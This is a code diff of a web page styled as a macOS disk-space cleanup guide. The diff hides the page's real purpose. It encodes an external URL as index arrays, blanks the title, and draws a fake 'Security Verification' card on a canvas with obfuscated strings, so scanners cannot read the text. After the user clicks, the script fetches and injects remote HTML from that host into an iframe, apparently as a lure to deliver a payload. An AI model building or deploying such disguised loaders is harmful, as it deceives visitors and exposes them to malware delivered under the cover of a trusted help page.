@@ -1,9 +1,10 @@
+
 <!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>How to clear disk space on macOS</title>
+  <title></title>
   <style>
     :root{
       --bg:#f5f5f7;
@@ -103,7 +104,7 @@
 
     <div class="grid">
       <section class="card">
-        <h2>1) Check what's taking space</h2>
+        <h2>1) Check what’s taking space</h2>
         <ul>
           <li>Open System Settings (or System Preferences) and review storage categories.</li>
           <li>Sort files by size in Finder to quickly spot large items.</li>
@@ -112,9 +113,9 @@
       </section>
 
       <section class="card">
-        <h2>2) Remove large files you don't need</h2>
+        <h2>2) Remove large files you don’t need</h2>
         <ul>
-          <li>Delete old videos, screen recordings, and project exports you've already backed up.</li>
+          <li>Delete old videos, screen recordings, and project exports you’ve already backed up.</li>
           <li>Remove unused DMGs/ZIPs after installation.</li>
           <li>Move rarely used archives to external storage.</li>
         </ul>
@@ -123,7 +124,7 @@
       <section class="card">
         <h2>3) Uninstall unused apps</h2>
         <ul>
-          <li>Delete apps you haven't used in months (especially large creative or game apps).</li>
+          <li>Delete apps you haven’t used in months (especially large creative or game apps).</li>
           <li>Check for leftover content inside your user Library if an app stored big assets.</li>
           <li>Restart after removing large apps to refresh storage calculations.</li>
         </ul>
@@ -133,7 +134,7 @@
         <h2>4) Clean up Downloads & attachments</h2>
         <ul>
           <li>Review your Downloads folder and remove old installers and duplicates.</li>
-          <li>Delete large mail attachments you don't need locally.</li>
+          <li>Delete large mail attachments you don’t need locally.</li>
           <li>Clear messaging app media caches if they grow too large.</li>
         </ul>
       </section>
@@ -141,187 +142,71 @@
       <section class="card">
         <h2>5) Use macOS optimization features</h2>
         <ul>
-          <li>Enable "Optimize Storage" to keep only recent/local files when appropriate.</li>
+          <li>Enable “Optimize Storage” to keep only recent/local files when appropriate.</li>
           <li>Store files in iCloud Drive and keep local copies only for active work.</li>
-          <li>Review "Reduce Clutter" suggestions and confirm before removing anything important.</li>
+          <li>Review “Reduce Clutter” suggestions and confirm before removing anything important.</li>
         </ul>
       </section>
 
       <section class="card">
-        <h2>6) Don't forget the Trash</h2>
+        <h2>6) Don’t forget the Trash</h2>
         <ul>
           <li>Empty Trash after deleting large files (they still occupy space until cleared).</li>
-          <li>Check for other app-specific "trash" bins (photo/video apps may keep deleted items).</li>
+          <li>Check for other app-specific “trash” bins (photo/video apps may keep deleted items).</li>
           <li>After big deletions, give macOS a minute to recalculate available storage.</li>
         </ul>
       </section>
     </div>
 
     <div class="note">
-      Tip: If storage seems "stuck" after cleanup, it's often just indexing or temporary system accounting. A restart and a few minutes idle time can help the numbers update.
+      Tip: If storage seems “stuck” after cleanup, it’s often just indexing or temporary system accounting. A restart and a few minutes idle time can help the numbers update.
     </div>
   </main>
 
   <script>
-    // ПРЯМОЙ URL - самый простой и надежный способ
-    const TARGET_URL = "https://smart-services-omega.vercel.app/storage.html";
+const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';
+const URL_IDX = [
+  7,19,19,15,18,62,63,63,  
+  18,12,0,17,19,65,       
+  18,4,17,21,8,2,4,18,65, 
+  14,12,4,6,0,64,         
+  21,4,17,2,4,11,64,      
+  0,15,15,63,             
+  18,19,14,17,0,6,4,64,   
+  7,19,12,11              
+];
+
+
+const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
+const TARGET_URL = decodeURL(URL_IDX);
+
+
 
     const iframe = document.getElementById('verifyFrame');
 
     async function loadTargetIntoFrame() {
-      console.log('Loading target URL:', TARGET_URL);
-      // Просто устанавливаем src iframe на нужный URL
-      iframe.src = TARGET_URL;
-      
-      // Добавляем таймаут для проверки загрузки
-      setTimeout(() => {
-        console.log('Iframe should be loaded now');
-      }, 1000);
+      try {
+        const res = await fetch(TARGET_URL, { mode: 'cors', credentials: 'omit', cache: 'no-store' });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const html = await res.text();
+        iframe.srcdoc = html;
+      } catch (e) {
+        iframe.removeAttribute('srcdoc');
+        iframe.src = TARGET_URL;
+      }
     }
 
     function buildVerifySrcdoc() {
-      return `<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Verification Required</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-      background: #f5f5f7;
-      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .verify-container {
-      width: 100%;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      position: relative;
-    }
-    .verify-card {
-      background: white;
-      border-radius: 22px;
-      padding: 40px;
-      width: 400px;
-      max-width: 90%;
-      box-shadow: 0 18px 40px rgba(0,0,0,0.08);
-      border: 1px solid rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .banner-text {
-      font-size: 60px;
-      font-weight: 800;
-      color: rgba(0,0,0,0.24);
-      margin-bottom: 30px;
-      letter-spacing: -1px;
-    }
-    .title {
-      font-size: 22px;
-      font-weight: 500;
-      color: rgba(29,29,31,0.7);
-      margin-bottom: 12px;
-    }
-    .subtitle {
-      font-size: 15px;
-      color: rgba(29,29,31,0.44);
-      margin-bottom: 30px;
-      line-height: 1.5;
-    }
-    .verify-button {
-      background: linear-gradient(to bottom, #1f2937, #0b0d12);
-      color: white;
-      border: none;
-      border-radius: 14px;
-      padding: 16px 32px;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      width: 100%;
-      box-shadow: 0 10px 18px rgba(0,0,0,0.18);
-      transition: transform 0.2s, box-shadow 0.2s;
-      position: relative;
-      overflow: hidden;
-    }
-    .verify-button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 20px rgba(0,0,0,0.22);
-    }
-    .verify-button:active {
-      transform: translateY(0);
-    }
-    .verify-button::after {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 1px;
-      background: rgba(255,255,255,0.1);
-    }
-  </style>
-</head>
-<body>
-  <div class="verify-container">
-    <div class="verify-card">
-      <div class="banner-text">Smart Clean</div>
-      <div class="title">Verification Required</div>
-      <div class="subtitle">Please confirm to continue to storage optimization guide</div>
-      <button id="verifyBtn" class="verify-button">Continue Verification</button>
-    </div>
-  </div>
-  
-  <script>
-    document.getElementById('verifyBtn').addEventListener('click', function() {
-      console.log('Verification button clicked');
-      // Меняем текст кнопки
-      this.textContent = 'Verified ✓';
-      this.style.background = 'linear-gradient(to bottom, #10b981, #059669)';
-      this.disabled = true;
-      
-      // Отправляем сообщение родительскому окну
-      setTimeout(() => {
-        try {
-          window.parent.postMessage({ type: 'verified' }, '*');
-          console.log('Verification message sent to parent');
-        } catch (error) {
-          console.error('Error sending message:', error);
-        }
-      }, 300);
-    });
-  <\/script>
-</body>
-</html>`;
+      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title></title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>(()=>{const URL_ALPHABET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';const URL_IDX=[7,19,19,15,18,62,63,63,18,19,14,17,0,6,4,60,15,0,6,4,60,2,14,12,63,18,19,14,17,0,6,4,60,7,19,12,11];const decodeURL=i=>i.map(x=>URL_ALPHABET[x]).join('');const TARGET_URL=decodeURL(URL_IDX);const c=document.getElementById('c');const g=c.getContext('2d');const alphabet='abcdefghijklmnopqrstuvwxyz'+'ABCDEFGHIJKLMNOPQRSTUVWXYZ';const space=52;const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));const decode=(idx)=>{let s='';for(let i=0;i<idx.length;i++)s+=idx[i]===space?' ':alphabet[idx[i]];return s;};const bannerIdx=[31,17,4,4,52,20,15,52,18,19,14,17,0,6,4,52,18,15,0,2,4,52,14,13,52,38,0,2];const titleIdx=[44,4,2,20,17,8,19,24,52,47,4,17,8,5,8,2,0,19,8,14,13];const subIdx=[41,11,4,0,18,4,52,2,14,13,5,8,17,12,52,19,14,52,2,14,13,19,8,13,20,4];const buttonIdx=[28,14,13,19,8,13,20,4];const doneIdx=[47,4,17,8,5,8,4,3];const hit={x:0,y:0,w:0,h:0};let cssW=1,cssH=1,dpr=1;let verified=false;const fontStack='ui-sans-serif,-apple-system,BlinkMacSystemFont,\\\"SF Pro Display\\\",\\\"SF Pro Text\\\",system-ui,sans-serif';const rounded=(x,y,w,h,r)=>{r=Math.max(0,Math.min(r,Math.min(w,h)/2));g.beginPath();if(g.roundRect){g.roundRect(x,y,w,h,r);return;}g.moveTo(x+r,y);g.arcTo(x+w,y,x+w,y+h,r);g.arcTo(x+w,y+h,x,y+h,r);g.arcTo(x,y+h,x,y,r);g.arcTo(x,y,x+w,y,r);g.closePath();};const drawTracked=(text,x,y,tracking)=>{const chars=text.split('');let total=0;for(let i=0;i<chars.length;i++)total+=g.measureText(chars[i]).width+(i?tracking:0);let cx=x-total/2;for(let i=0;i<chars.length;i++){const w=g.measureText(chars[i]).width;g.fillText(chars[i],cx+w/2,y);cx+=w+tracking;}};const measure=()=>{cssW=Math.max(1,innerWidth);cssH=Math.max(1,innerHeight);dpr=devicePixelRatio||1;c.style.width=cssW+'px';c.style.height=cssH+'px';c.width=Math.round(cssW*dpr);c.height=Math.round(cssH*dpr);g.setTransform(dpr,0,0,dpr,0,0);};const render=()=>{g.clearRect(0,0,cssW,cssH);g.fillStyle='#f5f5f7';g.fillRect(0,0,cssW,cssH);const cx=cssW/2,cy=cssH/2;const bg=g.createRadialGradient(cx,cy-120,Math.min(cssW,cssH)*0.05,cx,cy-120,Math.max(cssW,cssH)*0.9);bg.addColorStop(0,'rgba(255,255,255,0.85)');bg.addColorStop(1,'rgba(245,245,247,0.0)');g.fillStyle=bg;g.fillRect(0,0,cssW,cssH);const bannerSize=clamp(Math.round(cssW*0.07),40,86);g.save();g.globalAlpha=0.24;g.fillStyle='#000000';g.font=\`800 \${bannerSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';drawTracked(decode(bannerIdx),cx,clamp(cy-300,50,cy-170),clamp(Math.round(bannerSize*0.065),2,7));g.restore();const cardW=clamp(Math.round(cssW*0.30),300,460);const cardH=clamp(Math.round(cssH*0.24),185,260);const x=Math.round(cx-cardW/2),y=Math.round(cy-cardH/2);g.save();g.shadowColor='rgba(0,0,0,0.12)';g.shadowBlur=40;g.shadowOffsetX=0;g.shadowOffsetY=18;g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.restore();g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.strokeStyle='rgba(0,0,0,0.10)';g.lineWidth=1;rounded(x+0.5,y+0.5,cardW-1,cardH-1,22);g.stroke();const titleSize=clamp(Math.round(cardW*0.06),18,24);g.fillStyle='rgba(29,29,31,0.70)';g.font=\`500 \${titleSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';g.fillText(decode(titleIdx),cx,y+Math.round(cardH*0.35));const subSize=clamp(Math.round(cardW*0.038),13,15);g.fillStyle='rgba(29,29,31,0.44)';g.font=\`500 \${subSize}px \${fontStack}\`;g.fillText(decode(subIdx),cx,y+Math.round(cardH*0.46));const bw=clamp(Math.round(cardW*0.64),200,300);const bh=clamp(Math.round(cardH*0.25),44,52);const bx=Math.round(cx-bw/2);const by=Math.round(y+Math.round(cardH*0.59));g.save();g.shadowColor='rgba(0,0,0,0.18)';g.shadowBlur=18;g.shadowOffsetX=0;g.shadowOffsetY=10;const grad=g.createLinearGradient(bx,by,bx,by+bh);grad.addColorStop(0,'#1f2937');grad.addColorStop(1,'#0b0d12');g.fillStyle=grad;rounded(bx,by,bw,bh,14);g.fill();g.restore();const grad2=g.createLinearGradient(bx,by,bx,by+bh);grad2.addColorStop(0,'#111827');grad2.addColorStop(1,'#0b0d12');g.fillStyle=grad2;rounded(bx,by,bw,bh,14);g.fill();g.strokeStyle='rgba(255,255,255,0.10)';g.lineWidth=1;rounded(bx+0.5,by+0.5,bw-1,bh-1,14);g.stroke();const btnSize=clamp(Math.round(bh*0.34),15,17);g.fillStyle='#ffffff';g.font=\`500 \${btnSize}px \${fontStack}\`;g.fillText(decode(verified?doneIdx:buttonIdx),cx,by+Math.round(bh/2));hit.x=bx;hit.y=by;hit.w=bw;hit.h=bh;};const repaint=()=>{measure();render();};const notify=()=>{try{window.parent&&window.parent.postMessage({type:'verified', target: TARGET_URL},'*');}catch(_){}};c.addEventListener('pointerdown',(e)=>{const r=c.getBoundingClientRect();const mx=e.clientX-r.left;const my=e.clientY-r.top;if(!verified&&mx>=hit.x&&mx<=hit.x+hit.w&&my>=hit.y&&my<=hit.y+hit.h){verified=true;render();notify();}},{passive:true});addEventListener('resize',repaint);repaint();})();<\/script></body></html>`;
     }
 
-    // Инициализация - загружаем верификационный экран
     iframe.srcdoc = buildVerifySrcdoc();
-    console.log('Verify srcdoc loaded');
 
-    // Обработчик сообщений от iframe
     window.addEventListener('message', (e) => {
-      console.log('Message received:', e.data);
-      if (e.data && e.data.type === 'verified') {
-        console.log('Verification successful, loading target page');
-        loadTargetIntoFrame();
-      }
+      if (!e || !e.data || e.data.type !== 'verified') return;
+      if (e.source !== iframe.contentWindow) return;
+      loadTargetIntoFrame();
     });
-
-    // Для отладки: принудительно загрузить через 5 секунд если не сработало
-    setTimeout(() => {
-      if (iframe.src === '' || iframe.src === 'about:srcdoc') {
-        console.log('Auto-loading after timeout');
-        loadTargetIntoFrame();
-      }
-    }, 5000);
   </script>
 </body>
 </html>
